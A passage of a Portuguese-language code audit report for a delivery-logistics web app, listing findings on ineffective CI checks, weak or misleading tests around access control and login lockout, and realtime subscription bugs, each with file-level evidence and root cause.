- **Impacto no negócio:** Hoje não há spec em quarentena, então nada está escondido. O risco é no primeiro uso: alguém põe um teste na quarentena achando que está documentado e com prazo, o Playwright continua rodando o teste (ou o time o desliga com `test.skip` mesmo, sem prazo nenhum) e o controle não existe.
- **Evidência:**
  ```
  playwright.config.ts:14-15 `testDir: './e2e',` / `testMatch: '**/*.e2e.ts',` — nenhum testIgnore no arquivo. scripts/ci/check-quarantine.mjs:25-27 `Para a quarentena ter efeito, o "playwright.config.ts" precisa ignorar esses specs (testIgnore: specsEmQuarentena(quarentena)). Hoje o config do repo NÃO faz isso`. scripts/ci/check-quarantine.mjs:53-56 `if (!existsSync(arquivo)) { ... return { itens: [], avisos: [...] }; }`. EXECUTADO: `node scripts/ci/check-quarantine.mjs` → 'aviso: e2e/quarantine.js não existe — nada em quarentena' / 'check-quarantine: OK — 0 spec(s) em quarentena, nenhum vencido.', exit=0. Correção à evidência original: o guard SIM é exercitado na CI de forma indireta — .github/workflows/ci.yml:97 `run: node --test scripts/ci/*.unit.mjs` (job `guard-agents-md`, check obrigatório) + scripts/ci/check-quarantine.unit.mjs:86 `test('CLI no repositório real: sem e2e/quarantine.js sai 0 com aviso', ...)`.
  ```
- **Causa raiz:** O mecanismo foi portado pela metade: o verificador de forma e prazo existe, o arquivo de quarentena e a ligação com o Playwright não. Com arquivo ausente o guard sai 0 (scripts/ci/check-quarantine.mjs:55-59 trata ausência como "não é erro"), então nem o aviso chega a lugar nenhum.
- **Arquivos:** `scripts/ci/check-quarantine.mjs`, `playwright.config.ts`, `.github/workflows/ci.yml`
- **Etapas do plano:** 166

#### B-012 — Limite de cobertura de 70% em vitest.config.ts é decorativo: o pacote de cobertura não está instalado e nenhum workflow pede cobertura

- **Camada:** Testes
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quem abre a configuração acredita que existe um piso de 70% de cobertura garantido pela CI. Não existe nenhum piso: dá para remover testes à vontade sem nenhum alarme. Isso explica por que buracos grandes (webhook, criação de pedido) passaram despercebidos.
- **Evidência:**
  ```
  vitest.config.ts:9-16 `coverage: { provider: 'v8', reporter: ['text','json','html'], thresholds: { lines: 70, functions: 70, branches: 70, statements: 70 } }` e .github/workflows/ci.yml:36 `- run: npx vitest run --reporter=verbose`
  ```
- **Causa raiz:** A configuração de cobertura foi escrita mas nunca acompanhada do provedor nem de um passo que a execute. Vitest só aplica `thresholds` quando a cobertura é pedida explicitamente.
- **Arquivos:** `vitest.config.ts`, `package.json`, `.github/workflows/ci.yml`
- **Etapas do plano:** 167

#### B-020 — Nenhum job do ci.yml tem timeout nem concurrency

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Minutos de Actions queimados a toa e fila de CI lenta quando alguem empurra varios commits seguidos — o feedback de PR demora mais justamente nas horas de maior movimento.
- **Evidência:**
  ```
  .github/workflows/ci.yml: 0 ocorrencias de `timeout-minutes` e nenhuma de `concurrency` nos 12 jobs (ci.yml:10, 27, 39, 68, 80, 99, 110, 157, 186, 209, 241, 279). Comparar com deploy-edges.yml:19-21,26; apply-migrations.yml:24-26,31; contexto.yml:60-62; inventario-estado-semanal.yml:27-29.
  ```
- **Causa raiz:** O ci.yml e o unico workflow sem as duas travas. Sem `timeout-minutes`, um job travado (webServer do Playwright que nao sobe, psql esperando o service de Postgres) corre ate o limite padrao de 6 horas; sem `concurrency`, dois pushes seguidos na mesma branch rodam os 13 jobs em paralelo em vez de cancelar o run antigo.
- **Arquivos:** `.github/workflows/ci.yml`
- **Etapas do plano:** 202

#### B-021 — Os limites de cobertura de 70% do vitest nunca sao aplicados: a CI roda vitest sem --coverage

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O numero de 70% que aparece na configuracao e uma meta declarada que ninguem verifica; a cobertura real pode cair sem aviso.
- **Evidência:**
  ```
  vitest.config.ts:9-18 — `coverage: { provider: 'v8', reporter: ['text','json','html'], thresholds: { lines: 70, functions: 70, branches: 70, statements: 70 } }`; .github/workflows/ci.yml:37 — `      - run: npx vitest run --reporter=verbose`; package.json nao contem a string `coverage` (nem script `test`, nem `@vitest/coverage-v8`).
  ```
- **Causa raiz:** Os thresholds do vitest so sao avaliados quando a coleta de cobertura esta ligada. Sem `--coverage` (ou `coverage.enabled: true`), o bloco inteiro e configuracao morta e o job `test` passa com qualquer cobertura.
- **Arquivos:** `vitest.config.ts`, `.github/workflows/ci.yml`
- **Etapas do plano:** 203

#### B-022 — npm run lint nunca pode falhar: todas as regras ruidosas sao warning e o ratchet que conteria a divida esta quebrado

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A CI diz que o codigo passou no lint enquanto a divida cresceu de 533 para 554 problemas sem ninguem autorizar; o numero so aumenta, e o freio automatico esta enferrujado.
- **Evidência:**
  ```
  eslint.config.js:23 `"@typescript-eslint/no-unused-vars": "warn"`, :26 `"@typescript-eslint/no-explicit-any": "warn"`, :29 `"no-empty": ["error", { "allowEmptyCatch": true }]`, :30 `"no-console": ["warn", { "allow": ["warn", "error"] }]`; scripts/ci/eslint-baseline.json:4 `"eslintVersion": "10.10.0"` vs `npx eslint --version` -> v10.15.0; `node scripts/ci/lint-ratchet.mjs` -> EXIT=2.
  ```
- **Causa raiz:** Com tudo rebaixado a warning, `eslint .` sai com codigo 0 por construcao — o passo `- run: npm run lint` (ci.yml:19) e decorativo. O mecanismo pensado para segurar o crescimento e scripts/ci/lint-ratchet.mjs contra eslint-baseline.json (533 issues em 139 arquivos), mas ele (a) nao e chamado por workflow nenhum e (b) falha fail-closed: executei e deu EXIT=2 com `ERRO no lint ratchet: O ESLint ou eslint.config.js mudou desde a geracao do baseline`. A causa e a versao: o baseline grava `eslintVersion: 10.10.0` e o instalado e 10.15.0 (o sha do eslint.config.js confere — comparei: 09102ff5... nos dois lados). Como package.json:113 fixa `"eslint": "^10.10.0"`, qualquer bump de minor do eslint rebaixa o guarda a inutil ate alguem regerar o baseline a mao.
- **Arquivos:** `package.json`, `eslint.config.js`, `scripts/ci/lint-ratchet.mjs`, `scripts/ci/eslint-baseline.json`, `.github/workflows/ci.yml`
- **Etapas do plano:** 204

#### B-038 — O job deploy do ci.yml so imprime uma frase e aparece como deploy bem-sucedido

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quem olha a aba de Actions ve um deploy verde que nunca aconteceu — e a primeira coisa que se consulta quando se pergunta "ja subiu?".
- **Evidência:**
  ```
  .github/workflows/ci.yml:279-286 (job `deploy` cujo unico passo e um `echo`); .github/workflows/deploy-edges.yml:23-30 (o deploy real de edge, com dono).
  ```
- **Causa raiz:** Sobra do deploy antigo pela Lovable. Hoje o deploy de edge e feito por deploy-edges.yml (`supabase functions deploy`) e o do front pela Vercel (projeto lalamove-v2), como AGENTS.md descreve. O job continua no ci.yml verde a cada push na main, chamando-se "Deploy Edge Functions" sem implantar nada.
- **Arquivos:** `.github/workflows/ci.yml`, `.github/workflows/deploy-edges.yml`
- **Etapas do plano:** 238

#### B-054 — .lintstagedrc configurado sem lint-staged, husky nem prettier instalados

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Nada quebra hoje, mas o repositorio carrega uma configuracao que promete formatacao automatica e nao entrega; o proximo que confiar nela perde tempo.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/.lintstagedrc (2 globs, ambos chamando `prettier`); package.json sem husky/prepare/lint-staged/prettier; `.husky` inexistente; `.git/hooks/` sem hook ativo (apenas `.sample`); /home/user/Lalamove_V2/.prettierrc presente.
  ```
- **Causa raiz:** Configuracao herdada de um setup que nunca foi instalado neste repo. Sem `lint-staged` e sem hook de git (AGENTS.md ja registra que nao ha hook `commit-msg`), o arquivo nao tem efeito nenhum; e se alguem instalasse lint-staged hoje, o passo `prettier --write` falharia na hora por falta do binario — e o .prettierrc na raiz sugere que a formatacao e esperada.
- **Arquivos:** `.lintstagedrc`, `.prettierrc`, `package.json`
- **Etapas do plano:** 291

#### B-055 — A PR automatica do inventario semanal nasce sem CI e, com os required checks ativos, nao tem como ser mergeada

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O inventario semanal do estado real do sistema e gerado e depois empaca numa PR que ninguem consegue mergear sem trabalho manual — na pratica, para de atualizar.
- **Evidência:**
  ```
  .github/workflows/inventario-estado-semanal.yml:19-20 (comentario que afirma nao haver required check); :92-94 (`token: ${{ github.token }}`); :100-108 (corpo da PR sem instrucao de CI). Estado da branch protection: NAO VERIFICADO nesta sessao (sem acesso a API), baseado em AGENTS.md.
  ```
- **Causa raiz:** A premissa do comentario ("a main nao tem required check") deixou de valer. PR aberta com o GITHUB_TOKEN nao dispara workflow; com 7 checks obrigatorios e nenhum deles reportando, a PR fica permanentemente "Expected — Waiting for status to be reported" e o botao de merge fica bloqueado, inclusive para admin (`enforce_admins.enabled: true`).
- **Arquivos:** `.github/workflows/inventario-estado-semanal.yml`
- **Etapas do plano:** 292
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nao abri nem inspecionei a PR `automation/inventario-estado` real (nao consultei o estado de checks dela no GitHub) — a conclusao vem de juntar a regra do GITHUB_TOKEN descrita no proprio workflow com os 7 required contexts lidos na API.


## Causa raiz: Teste que passa sem exercitar o que deveria proteger

A suíte de testes dá sensação de segurança que ela não entrega. O teste do único portão de controle de acesso finge que o usuário sempre tem permissão, então a recusa de papel nunca é verificada; o teste de acesso por papel aceita os dois desfechos opostos e passa de qualquer forma; há um arquivo com 40 testes que copiaram a lógica para dentro do próprio teste e não importam uma linha do sistema; a parte do negócio que recebe os avisos da Lalamove e a que cria e cancela pedido vivem dentro de funções não exportáveis e, por isso, nenhuma das 15 ações tem teste; o bloqueio por tentativas de login é testado com o servidor simulado; e um teste se pula justamente na falha que ele existe para pegar.

**8 achado(s) sob esta causa.**


#### M-054 — Negação de papel do ProtectedRoute (o único portão RBAC do app) não tem teste em lugar nenhum

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se alguém quebrar a trava de acesso por papel, um usuário de nível baixo (viewer/operator) passa a abrir telas de administrador — segurança, papéis, telemetria — e os 7 checks obrigatórios da CI continuam verdes. O erro só apareceria quando alguém de fora do time visse dado que não devia.
- **Evidência:**
  ```
  src/components/auth/ProtectedRoute.tsx:54-67 (negação de papel) e :71-78 (negação de permissão); src/components/auth/ProtectedRoute.test.tsx:20 e :44-48 (helper sem requiredRole + hasRole/hasPermission sempre true nos 4 casos).
  ```
- **Causa raiz:** O teste do ProtectedRoute foi escrito para cobrir os estados de MFA (loadingAAL, needsMFAVerification, needsMFAEnrollment) e mocka `hasRole`/`hasPermission` sempre como `true`. Com isso os dois ramos de negação (ProtectedRoute.tsx:54-66 para papel e :71-78 para permissão) nunca são executados por nenhum teste. O e2e que deveria cobrir isso (e2e/rbac.e2e.ts:58) pula na CI e não afirma nada sobre papel.
- **Arquivos:** `src/components/auth/ProtectedRoute.tsx`, `src/components/auth/ProtectedRoute.test.tsx`, `e2e/rbac.e2e.ts`
- **Etapas do plano:** 133

#### M-055 — Teste e2e obrigatório bate no endpoint real de recuperação de senha, sem interceptar, e só passa no caminho feliz

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O check obrigatório "E2E (Playwright)" pode ficar vermelho e travar merge por causa do limite de envio de e-mail do fornecedor, não por defeito no código. E cada execução da CI dispara um pedido real de recuperação de senha no projeto configurado, somando ao contador de limite do Auth.
- **Evidência:**
  ```
  e2e/password-reset.e2e.ts:47 `await expect(page.getByText(/Se existir uma conta/i)).toBeVisible({ timeout: 15_000 });` + src/pages/ForgotPasswordPage.tsx:37-39 `if (resetError) throw resetError;` / `setRequestSent(true);` e :41-43 `} catch { toast.error('Erro ao enviar email de recuperação. Tente novamente.'); }`
  ```
- **Causa raiz:** O teste depende do Auth real apontado por `VITE_SUPABASE_URL` (passado como secret em .github/workflows/ci.yml:54). Qualquer resposta de erro do backend — limite de envio do Supabase Auth, instabilidade, secret trocado — cai no `catch` da ForgotPasswordPage, a tela de confirmação não aparece e o teste falha por motivo que não tem relação com o PR.
- **Arquivos:** `e2e/password-reset.e2e.ts`, `src/pages/ForgotPasswordPage.tsx`, `.github/workflows/ci.yml`
- **Etapas do plano:** 134

#### M-056 — src/__tests__/improvements-validation.test.tsx: 40 testes que não importam uma linha do aplicativo

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** 40 dos 1050 testes verdes não testam o sistema — e são justamente os que prometem cobrir o filtro de menu por papel e os números do painel. Inflam a sensação de cobertura e empurram para depois o teste de verdade dessas duas coisas.
- **Evidência:**
  ```
  src/__tests__/improvements-validation.test.tsx:6 `import { describe, it, expect } from 'vitest';` (único import do arquivo de 519 linhas, 40 `it`) · :32-37 `const roleHierarchy ... const hasRequiredRole = (userRole, required) => { if (!required) return true; ... }` · :21 `expect(a).toBe(b); // Same reference = singleton confirmed`.
  ```
- **Causa raiz:** O arquivo foi escrito como "validação das melhorias recentes" copiando a lógica para dentro do teste em vez de importar de src/lib/roles.ts, src/components/layout/sidebar-config.ts e dos hooks do dashboard. Como nada do app é importado, nenhuma mudança no app pode fazer esses 40 testes falharem.
- **Arquivos:** `src/__tests__/improvements-validation.test.tsx`
- **Etapas do plano:** 135

#### M-089 — O bloqueio por tentativas de login (anti-força-bruta) não tem nenhum teste da implementação real — o e2e simula o backend inteiro

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A defesa contra quem tenta adivinhar senha por força bruta não é verificada por nada. Se a função do banco for alterada e parar de contar as tentativas, o teste de lockout continua verde e a conta deixa de ser bloqueada — e isso só se descobre quando alguém entrar.
- **Evidência:**
  ```
  Definição única em supabase/migrations/20260109204414_4f9e55d1-a4a0-41ad-b2c3-e7bc13f39347.sql:30-120; 20260715184538:6-7 só REVOKE/GRANT; e2e/login-lockout.e2e.ts:66 e :77 interceptam as duas RPCs; src/hooks/__tests__/useLoginLockout.test.ts:5-9 mocka o client inteiro; supabase/tests/run.sh:51-57 extrai só as 6 funções de geo/job_queue.
  ```
- **Causa raiz:** O lockout foi testado só na camada de interface, com as RPCs interceptadas pelo Playwright. A contagem de tentativas, a janela de bloqueio e a liberação vivem em função SQL que nenhum teste executa. O e2e passaria igual se as duas RPCs fossem apagadas do banco.
- **Arquivos:** `e2e/login-lockout.e2e.ts`, `supabase/migrations/20260109204414_4f9e55d1-a4a0-41ad-b2c3-e7bc13f39347.sql`, `supabase/migrations/20260715184538_b9d1dde2-5dfd-41f8-87f9-e4017f5a2acf.sql`, `supabase/tests/run.sh`
- **Etapas do plano:** 184

#### M-090 — O teste de RBAC autenticado passa tanto se o usuário for barrado quanto se ele entrar

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O repositório tem um teste chamado "usuário sem papel de admin é barrado" que ficaria verde mesmo se a trava de administrador fosse removida. Quem lê o nome do teste acredita que a hierarquia de papéis está protegida; ela não está.
- **Evidência:**
  ```
  e2e/rbac.e2e.ts:65-69 — comentário admitindo os dois desfechos e a única asserção `not.toHaveURL(/\/auth/)`.
  ```
- **Causa raiz:** A única asserção é "não caiu na tela de login". Os dois desfechos opostos — admin entra em /security, ou não-admin é mandado para /unauthorized — satisfazem a asserção. O teste não checa o papel do usuário da sessão nem a URL final, então não verifica a hierarquia que o título promete.
- **Arquivos:** `e2e/rbac.e2e.ts`
- **Etapas do plano:** 185

#### M-091 — Webhook da Lalamove: só o HMAC é testado; mapeamento de status, replay e idempotência não têm teste e o arquivo não exporta nada

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** É o canal por onde a Lalamove avisa que o pedido foi coletado, entregue ou cancelado. Se a Lalamove criar ou renomear um status, todo pedido nesse status passa a ser gravado como "em andamento" — o painel mostra entrega em curso para pedido já cancelado, e nenhum teste acusa. E a defesa contra reenvio de mensagem antiga é desligada por quem simplesmente omite o campo de data.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts: 0 exports em 989 linhas; :55, :67, :108, :124-125, :136 (lógica não exportada), :530 (`|| 'ON_GOING'`), :275-303 (dedup por idempotency_key); security.test.ts:5 importa só ./security.ts.
  ```
- **Causa raiz:** A lógica de negócio do webhook vive dentro do `serve()` e de funções não exportadas no index.ts de 989 linhas, então é inalcançável por teste. O que foi extraído para módulo (security.ts, normalize.ts) tem teste bom; o resto não. Daí os dois comportamentos silenciosos: status desconhecido da Lalamove vira `ON_GOING` em vez de erro, e payload sem campo `timestamp` passa pela proteção de replay.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/functions/lalamove-webhook/security.test.ts`
- **Etapas do plano:** 186

#### M-144 — Cotação, criação e cancelamento de pedido na edge lalamove-api: nenhuma das 15 ações tem teste, nem a assinatura HMAC que autentica todas elas

- **Camada:** Testes
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** É o caminho do dinheiro: cotar, criar e cancelar pedido na Lalamove. Se a fórmula da assinatura sair do lugar — um `\r\n` a menos, o corpo serializado de outro jeito — a Lalamove recusa tudo com erro de autenticação e nenhum pedido sai, e a CI continua verde porque nada testa isso. A duplicação torna provável que uma correção seja aplicada em só uma das duas cópias.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:433 (único export), :96-116 e :126 (HMAC local), :1134-1145 (HMAC duplicado no selftest), 15 `case` entre :704 e :1176; coordinates.test.ts:2 e geocode-fallback.test.ts:2.
  ```
- **Causa raiz:** Mesmo padrão do webhook: o handler monolítico não exporta a lógica, então só os dois módulos extraídos (coordinates.ts, geocode-fallback.ts) são testáveis. A fórmula de assinatura `${timestamp}\r\n${method}\r\n${path}\r\n\r\n${body}` aparece duas vezes no arquivo, em implementações independentes, sem nenhum teste que as compare.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-api/coordinates.test.ts`, `supabase/functions/lalamove-api/geocode-fallback.test.ts`
- **Etapas do plano:** 282

#### B-061 — O teste que protege a coordenada do pedido se auto-pula justamente quando o geo-gateway falha

- **Camada:** Testes
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O teste que deveria avisar "endereço digitado não virou coordenada" se cala exatamente nessa hora. É o cenário que já colocou entrega na coordenada 0,0 — citado em e2e/autocomplete.e2e.ts:86 ("Coordenada 0,0 é o fallback que colocava a entrega no Golfo da Guiné").
- **Evidência:**
  ```
  e2e/new-order-autocomplete.e2e.ts:72 `test.skip(!pickup || !delivery, 'O gateway não devolveu coordenada para os endereços de teste');` — alcançável só quando a sessão é injetada, pois :64 `test.skip(!session, 'Sessão Supabase não injetada neste ambiente');` pula o describe na CI.
  ```
- **Causa raiz:** O teste trata "o gateway não devolveu coordenada" como condição de ambiente e pula, em vez de falhar. Mas é esse o defeito que ele existe para pegar: o título do arquivo é "a coordenada escolhida no autocomplete chega ao corpo da cotação". Se o autocomplete parar de devolver coordenada, o teste fica verde (pulado) e o pedido sai sem ponto no mapa.
- **Arquivos:** `e2e/new-order-autocomplete.e2e.ts`, `e2e/autocomplete.e2e.ts`
- **Etapas do plano:** 298


## Causa raiz: Cada tela montou seu próprio ciclo de atualização e seu próprio consumo pago, sem dono único

O acompanhamento ao vivo e as contagens da barra lateral foram implementados tela por tela, e agora a mesma tabela é consultada por dois ou três relógios simultâneos mais dois canais de tempo real, cada um refazendo a consulta inteira a cada ponto de GPS. Pior: o canal de tempo real usa um nome fixo compartilhado, então sair de uma tela desliga o tempo real de todas as outras — o alerta crítico simplesmente para de aparecer. Do lado do custo, cada troca de estilo no mapa cobra um novo carregamento, uma animação roda sem parar mesmo sem movimento, a verificação de saúde consome a credencial do mapa a cada 30 segundos e as opções "grátis" puxam imagens direto de servidores públicos.

**10 achado(s) sob esta causa.**


#### A-033 — Painel de SLA: 5 consultas sem limite a cada 10 s, uma delas inútil, e erro de consulta vira "100% no prazo"

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O painel pode exibir 100% de entregas no prazo justamente quando a consulta falha, escondendo atraso; e o sistema puxa a base inteira a cada 10 segundos, o que pesa em custo e velocidade do Supabase.
- **Evidência:**
  ```
  src/hooks/useSLAMetrics.ts:66-69 `supabase.from('drivers').select('*').in('status', ['APPROVED', 'WHITELIST'])`; :72-76 `const orders = ordersResult.data || []; ... // Note: driversResult fetched for potential future use`; :168-170 `onTimeRate: completedOrders.length > 0 ? Math.round((onTimeOrders.length / completedOrders.length) * 100) : 100`; :191 `refetchInterval: 10000`. Ramo de erro morto em src/pages/SLADashboardPage.tsx:58 `if (error || !metrics) {`.
  ```
- **Causa raiz:** O hook lê cinco tabelas inteiras com `select('*')` a cada 10 s (mais a cada evento realtime das 3 tabelas assinadas) e nenhum dos cinco resultados tem checagem de `error`: todos caem em `|| []` (:68-72). Com lista vazia por falha, `completedOrders.length === 0` e a pontualidade é publicada como 100%. Além disso `driversResult` é buscado e nunca usado, por comentário do próprio código — varredura completa de `drivers` a cada 10 s sem destino.
- **Arquivos:** `src/hooks/useSLAMetrics.ts`
- **Etapas do plano:** 071

#### A-046 — Canal realtime compartilhado por tópico: desmontar uma tela mata o tempo real de todas as outras (alerta crítico para de aparecer)

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Depois que o operador sai da tela de Alertas, os alertas críticos param de aparecer na hora (só voltam no refresh automático de 30 s, sem aviso sonoro nem notificação); e enquanto várias telas estão abertas o mesmo alerta toca e aparece repetido.
- **Evidência:**
  ```
  src/hooks/useRealtimeSubscriptions.ts:164 `.channel('alerts-consolidated')`; :272 `supabase.removeChannel(channel);`; src/hooks/useActiveAlerts.ts:46 `useAlertsRealtime(isAuthenticated);` e :51 `refetchInterval: 30000,`; node_modules/@supabase/realtime-js/dist/main/RealtimeClient.js:340-349 (reuso por tópico) e :257-262 (`removeChannel` → `unsubscribe` + `teardown`); REFUTA a duplicação: node_modules/@supabase/realtime-js/dist/main/RealtimeChannel.js:791-797 (binding `postgres_changes` duplicado é ignorado)
  ```
- **Causa raiz:** Cada montagem de useActiveAlerts (Header, AppLayout, MobileBottomNav, AlertsPage, DashboardRedesigned) chama supabase.channel('alerts-consolidated'), que devolve SEMPRE o mesmo objeto de canal, e cada uma adiciona suas próprias ligações `.on('postgres_changes', ...)`. Duas consequências: (a) o handler de INSERT roda uma vez por consumidor montado, repetindo toast, som e invalidação; (b) no cleanup, o primeiro consumidor que desmonta executa `removeChannel` no canal compartilhado e derruba as ligações de todos os outros, que continuam montados e cujos efeitos não rodam de novo — o tempo real morre até que algum componente monte de novo. O mesmo padrão existe em 'sidebar-counts-consolidated' (Sidebar + MobileSidebar) e nos demais tópicos fixos do arquivo.
- **Arquivos:** `src/hooks/useRealtimeSubscriptions.ts`, `src/hooks/useActiveAlerts.ts`, `src/components/layout/Header.tsx`, `src/components/layout/AppLayout.tsx`, `src/components/layout/MobileBottomNav.tsx`, `src/pages/AlertsPage.tsx`, `src/pages/DashboardRedesigned.tsx`, `src/components/layout/Sidebar.tsx`, `src/components/layout/MobileSidebar.tsx`
- **Etapas do plano:** 085

#### A-061 — useSidebarCounts.refetchCounts muda de identidade a cada render e recria o canal realtime da sidebar sem parar

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Os contadores de alertas, aprovações e incidentes ao lado do menu deixam de se atualizar sozinhos de forma confiável, e o app fica abrindo e fechando conexão em loop (consumo de conexões Realtime do plano e bateria no celular).
- **Evidência:**
  ```
  src/hooks/useSidebarCounts.ts:48-50 `const refetchCounts = useCallback(() => { for (const r of results) r.refetch(); }, [results]);` e :42-45 (três queries com prefixo 'sidebar-count', sem `refetchInterval`); src/hooks/useRealtimeSubscriptions.ts:382 `.channel('sidebar-counts-consolidated')`, :399 `supabase.removeChannel(channel);`, :401 `}, [onUpdate]);`; src/components/layout/Sidebar.tsx:35-36 e src/components/layout/MobileSidebar.tsx:153-154; AppLayout.tsx:293-299 (ambos montados ao mesmo tempo); node_modules/@tanstack/query-core/build/modern/queriesObserver.js:181-184 e :206 (array novo por render)
  ```
- **Causa raiz:** O array devolvido por `useQueries` nunca é referencialmente estável, então o `useCallback([results])` produz função nova em todo render. Como o efeito de `useSidebarCountsRealtime` depende dessa função, cada render do Sidebar/MobileSidebar executa `removeChannel` e assina de novo o canal 'sidebar-counts-consolidated'. Combina com o achado anterior: Sidebar e MobileSidebar compartilham o mesmo tópico, então o render de um derruba a assinatura do outro.
- **Arquivos:** `src/hooks/useSidebarCounts.ts`, `src/components/layout/Sidebar.tsx`, `src/components/layout/MobileSidebar.tsx`, `src/hooks/useRealtimeSubscriptions.ts`
- **Etapas do plano:** 214

#### M-008 — geo-gateway: todas as chamadas internas (job-worker) compartilham um único balde de 20 req/min, porque o id do usuário cai em "service_role"

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em pico de pedidos a fila de processamento começa a receber "muitas requisições, aguarde" dela mesma: rotas e endereços deixam de ser calculados, os jobs falham e tentam de novo, e o mapa fica sem rota prevista. Não é falta de cota paga — é o próprio sistema se barrando.
- **Evidência:**
  ```
  supabase/functions/geo-gateway/index.ts:79-86 — `function uidFromJwt(req: Request): string { try { const token = ...; const payload = JSON.parse(atob(...)); return String(payload.sub ?? payload.role ?? "anon"); } catch { return "anon"; } }`. supabase/functions/geo-gateway/index.ts:66-77 — `const USER_LIMITS: Partial<Record<GeoFunction, number>> = { autocomplete: 60, tiles: 120 }; ... function userAllowed(uid: string, fn: GeoFunction): boolean { const limit = USER_LIMITS[fn] ?? 20; ... const key = \`${uid}:${fn}\`;`. supabase/functions/geo-gateway/index.ts:267-270 — `const fn = ACTION_FUNCTION[action]; if (!userAllowed(uid, fn)) { return jsonResponse(buildErrorBody(ERROR_CODES.RATE_LIMITED, "Muitas requisições; aguarde 1 minuto.", [], version), 429, ...`. O job-worker chama com o client service_role: supabase/functions/job-worker/index.ts:179-180 — `async function invokeEdge(supabase: any, fn: string, body: Record<string, unknown>) { const { data, error } = await supabase.functions.invoke(fn, { body });` e os pontos de uso em :308, :360, :433, :570, :653 (`'geo-gateway'` com actions geocode-batch, route, snap).
  ```
- **Causa raiz:** O balde por usuário foi desenhado para o `sub` do JWT de uma pessoa. Quando o chamador é uma edge interna, o JWT é a service_role, que não tem `sub` — o fallback `payload.role` devolve a string `"service_role"`, então todo o trabalho de fila (geocodificação em lote, cálculo de rota, snap) divide um único balde por função: 20 chamadas por minuto para `route`, 20 para `matrix`, 20 para `snap`, 20 para `geocode`. Pela mesma razão, qualquer caller usando a chave publicável do front cai no balde `"anon"`.
- **Arquivos:** `supabase/functions/geo-gateway/index.ts`, `supabase/functions/job-worker/index.ts`
- **Etapas do plano:** 046

#### M-083 — Rastreamento ao vivo refaz a consulta inteira a cada evento de GPS, além do intervalo de 5 s

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Com a frota em movimento, o mapa consome muito mais banco e banda do que precisa (custo do Supabase e travamento no celular), sem ganho de atualização em relação ao refresh de 5 segundos que já existe.
- **Evidência:**
  ```
  src/components/map/hooks/useTrackingData.ts:90-92 `.on('postgres_changes', { event: '*', schema: 'public', table: 'active_tracking' }, () => { fetchTrackingData(); })` e :95 `const interval = setInterval(fetchTrackingData, 5000);`, sobre o select de :53-63; publicação confirmada em supabase/migrations/20260315222201_0c1d93b1-ea35-4028-9815-d64f854339c9.sql:3
  ```
